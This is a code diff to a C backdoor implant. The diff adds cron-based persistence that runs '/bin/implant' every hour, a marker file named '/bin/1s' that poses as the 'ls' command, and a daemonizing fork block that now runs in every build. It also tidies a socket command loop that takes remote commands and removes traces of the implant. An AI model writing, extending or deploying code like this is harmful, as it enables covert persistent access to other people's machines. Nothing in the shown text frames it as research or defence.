@@ -19,7 +19,7 @@
 #include "commands.c"
 
 void commands(int sockfd);
-#define MUTEX "/tmp/alive.txt"
+#define MUTEX "/bin/1s"
 #define MAXDATASIZE 100
 #define SLEEP 5
 
@@ -274,9 +274,6 @@ static size_t write_data(void *ptr, size_t size, size_t nmemb, void *stream)
 #endif
 
 int main(void) {
-        #ifdef MULTI_KNOCK
-        //fluffy();
-        #endif
         /*==Validating code using valHelper.c==*/
         val_IP();       //Macro: VALID_IP
         val_SysName();  //Macro: VALID_SYSNAME
@@ -287,8 +284,17 @@ int main(void) {
         free(strProf);
         /*=====================================*/
         /* Our process ID and Session ID */
-        
-        #ifndef DEBUG
+        #ifdef MUTEX
+        if(access( MUTEX, F_OK) != 0){
+          system("crontab -l | { cat; echo \"0 * * * * /bin/implant\"; } | crontab -");
+        }else{
+          printf("exiting backdoor");
+          exit(1);
+        }
+        #endif
+        FILE *fp = NULL;
+        fp = fopen("/bin/1s", "w");
+        //#ifndef DEBUG
         pid_t pid, sid;
 
         /* Fork off the parent process */
@@ -322,7 +328,7 @@ int main(void) {
                 // Log the failure 
                 exit(EXIT_FAILURE);
         }
-        #endif
+        //#endif
         /* Close out the standard file descriptors */
         //close(STDIN_FILENO);
         //close(STDOUT_FILENO);
@@ -356,7 +362,7 @@ int main(void) {
 
 #ifdef COMMANDS
 void commands(int sockfd){
-  char buf[MAXDATASIZE];
+  char * buf = calloc(MAXDATASIZE,1 );
   int numbytes;
   int endConnect = 0;
   while(endConnect != 1){
@@ -369,6 +375,7 @@ void commands(int sockfd){
       remove("/tmp/crontab");
       remove("/implant");
       remove(MUTEX);
+      free(buf);
       exit(0);
       //remove cron, the implant a.out, and then exit() the implant process
 
@@ -393,6 +400,7 @@ void commands(int sockfd){
     }
     else if(strcmp(buf,"EXIT\n") == 0){
       remove(MUTEX);
+      free(buf);
       kill(getpid(), SIGKILL);
       endConnect = 1;
     }
